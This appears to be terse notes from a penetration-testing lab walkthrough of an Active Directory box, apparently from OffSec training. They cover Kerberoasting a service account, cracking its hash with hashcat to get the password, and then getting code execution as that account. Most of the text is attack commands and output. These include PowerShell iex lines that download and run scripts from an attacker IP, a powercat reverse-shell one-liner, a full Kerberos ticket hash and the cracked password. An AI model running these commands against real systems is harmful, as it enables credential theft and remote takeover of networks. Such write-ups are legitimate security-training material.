To request the ticket, two commands can be executed to request and store the ticket in the memory\.

PS\> Add\-Type \-AssemblyName System\.IdentityModel
PS\> New\-Object System\.IdentityModel\.Tokens\.KerberosRequestorSecurityToken \-ArgumentList ‘\<\<SPN\>\>’

To get the kerberoast hash of the ticker, "Invoke\-Kerberoast\.ps1" is needed to extract the hash from memory\.

PS\> iex\(new\-object net\.webclient\)\.downloadString\('[http://192.168.45.203/Invoke-Kerberoast.ps1');](#http://192.168.49.211:80/Invoke-Kerberoast.ps1';)
Invoke\-Kerberoast \-OutputFormat Hashcat

hashcat \-m 13100 \-\-force \-a 0 sql\.hash /usr/share/wordlists/rockyou\.txt

$krb5tgs$23$\*svc\_mssql$access\.offsec$MSSQLSvc/DC\.access\.offsec\*$24D5196239027A1AC0BB15CE8E401093$76130ABCFB91B463EE5F90544E302CE287FEA58EEF22B877779E8C089C301F8D37AC72D3E80681843A11E4914ADF5656BAEC8AAA1C16D4625575B80C2E54614382F450A1A49C56F180CCF801A96F4704CE6F2D86B5C823FF11ADA153C42D6DCAD146A8F9295FEE5CAEE03B7CC95F0600EA02E715FAB5E3B8D787BBFBCF2970A315277D54F4C453726941AA8BA279CAF440FF435FFEED8C1B740EC4889001CBB08D8196FBEC1AC61FA9C3641905F82A6C3C7FBE202FB87815DE794361B1371F7BBA7B434E10D479B2510F873D5D4A614DA0BFB3C0AA70F45AC2DD98642CA3CE9B1A9725085FB0ABC109F866AD3D32C3711D6371634FCC7C30ED3E95F4B161196329B93CD697758EF84AD6B8C55893C891ADEDBC15D05C04410AC97AA6269FB17A8344ED932B1FE5E6E83EB0D31F0287CA5DACEBEA12DA47AAB177B11384DDA1BDA0A0FA1E92A4C5A2814ECD7ED1A94FFD7957778D6A8207AC656D2FFF4F4E33DB51FA0065152DD1C8F15A3F413DEFD2C504C108F218755898D53C5D1BB6F11CD45D82221A119ABE41C4A7EE40A83F2AD5981606AECD3984606250451ADE576914B5BBCD48339F15EA9075B9190AF0AAF54B7CE798344C8464CCD622765833DD089CD2CB17A733B00C47FE97704247E4545FA834AE48D0F436E9EC9D1D396530717EA014517B98C49D4496F606659D848C98D9E2AF9ADFB1256AAE6168435DFBC1C85BE2C7BEDF05E878DE5DC7550952D801AAC9800D34F96CAFA37888F1C05FF69EFCF7F6B727D8276AAF21DC29A66A778FE6400569B8ED731C13D73CCE79DED242358CA661536E49B9FA680CC57D65FD2B22A4DA1E7FAB8FCB31CA3AD7158BECE9036D62BA193011F7C1070D626CF8D5A6EE4E7ADAB99A5F0CFF68F927A80D7934F651EFC3CB613953971B4179CFF8622E6602E5F46668C46EC363170D49421DB40577B3E8192571BA007A6AB91816F6706373607B1D98A7B83A1705C02D5F8F29DB9FC0A0D4DCCBD00379299CF7D03E4AE474A4D1E7F9C57F4E145B52E73AEFA5DAA8106B32D45A8353B9C3DAB2ED1BC5132529FBF432B45C84A497B6EE9157914ABD279FB11146B911524852AB3874B835EBE46632D63CEF781B123CE499AEE3160FF1BEE9C3A8BE3432611CD56285EF2948BE76A81ADDB1D187A0590930B6947D89D62C7CB2146596895F7039D66902B948707BFDBAAB6933CB21B2CF2B6403A159736F873B570D6A8A6D2C4D9E40B1E452526139E41152E85BE0FADB46905AD22470893EB42D0C5F493E65301D717B63F5A8CB2A1E2C9868F70B8A620D61D6C290F267863BE4CE182E5EA975EA18341B85602F2313B926DBDC804633289D7B65350404CB8E68895678A0B387D52EFF7CB70FBB453C3AFC1F1FDD524E16624FE3449394FF2D6187BD711FFC3CBCD40F0451FC4D1805AC40E67E462BDA789C2AB8FA631BF3BB094F57A5A89F9379BC96D50ACDD447668715036F2956D91A54B709CB875AE0203641808620D3BFC271FC152FA811D71A41AB9916519E7F26890CDFE3DE283495013216CBC4CB97A1139062E540BE1309C78CD8A143778C4A8F2FB7A893D6D53FE17BDEF3FD7047FAB4FB82:trustno1

-  tried smbclient \\\\\\\\192\.168\.199\.40\\\\ \-U 'access\.offsec\\\\svc\_mssql'
but can not access SMB share as svc\_mssql

-  send Invoke\-RunasCs\.ps1to victim machine to run commands as svc\_mssql

-  import module \./Invoke\-RunasCs\.ps1
-  Invoke\-RunasCs \-Username svc\_mssql \-Password trustno1 \-Command “whoami”

-  send powercat\.ps1 to victim machine to get a netcat\-like reverse shell
-  Invoke\-RunasCs \-Username svc\_mssql \-Password trustno1 \-Command "Powershell IEX\(New\-Object System\.Net\.WebClient\)\.DownloadString\('[http://192.168.45.203/powercat.ps1');powercat](#http://192.168.45.203/powercat.ps1';powercat)
\-c 192\.168\.45\.203 \-p 5555 \-e cmd"
$$ local\.txt
